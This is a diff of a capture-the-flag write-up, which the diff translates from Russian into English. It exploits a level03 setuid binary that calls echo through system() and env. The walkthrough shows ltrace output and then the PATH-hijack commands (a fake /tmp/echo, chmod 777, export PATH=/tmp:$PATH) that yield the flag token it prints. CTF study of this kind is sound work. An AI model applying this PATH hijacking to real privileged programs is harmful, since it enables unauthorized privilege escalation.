@@ -1,7 +1,7 @@
-1. В директории видим исполнительный файл level03
-2. При попытке его запуска выводится текст "Exploit me". Это наводит на мысль что для перехода на flag03/level03 нужно воспользоваться какой-то узвимостью этого исполнительного файла
-3. С помощью команды ltrace проверяем, какие системные вызовы делает исполняемый файл:
-
+1. We are given `level03` executable. Attempt to launch it results to oupupt: "Exploit me". Seems like this binary has some vulnerability inside
+2. Check system calls during execution
+```
+$ ltrace ./level03
 __libc_start_main(0x80484a4, 1, 0xbffff6e4, 0x8048510, 0x8048580 <unfinished ...>
 getegid()                                                = 2003
 geteuid()                                                = 2003
@@ -12,11 +12,15 @@ system("/usr/bin/env echo Exploit me"Exploit me
 --- SIGCHLD (Child exited) ---
 <... system resumed> )                                   = 0
 +++ exited (status 0) +++
-
-4. По выводу выше можно судить, что очевидное уязвимое место - вызов команды echo, куда можно с помощью обратных кавычек передать команду на исполнение чего-либо. Однако воспользоваться этим будет затруднительно, так как необходимо будет поменять содержимое бинарного файла. Другой вариант эксплойта - подменить содержимое команды echo.
-5. В папке /tmp создаем файл под названием echo, внутрь записываем getflag
-6. Даем права на исполнение файлу: chmod 777 /tmp/echo
-7. Добавляем в переменную окружение PATH путь к нашему поддельному echo
+```
+3. Here it's possible to exploit `echo` command, replacing it with our fake `echo`
+4. Create file `/tmp/echo` that will contain `getflag`, give full rights
+``` Bash
+echo getflag > /tmp/echo
+chmod 777 /tmp/echo
+```
+5. Add to environmental variable PATH our path to fake `echo`
+``` Bash
 export PATH=/tmp:$PATH
-8. Выполнение исполнительного файла дает токен: qi0maab88jeaj46qoumi7maus
-9. Данный токен подошел к юзеру level04
+```
+6. Execution of binary results flag output for level04: **qi0maab88jeaj46qoumi7maus**
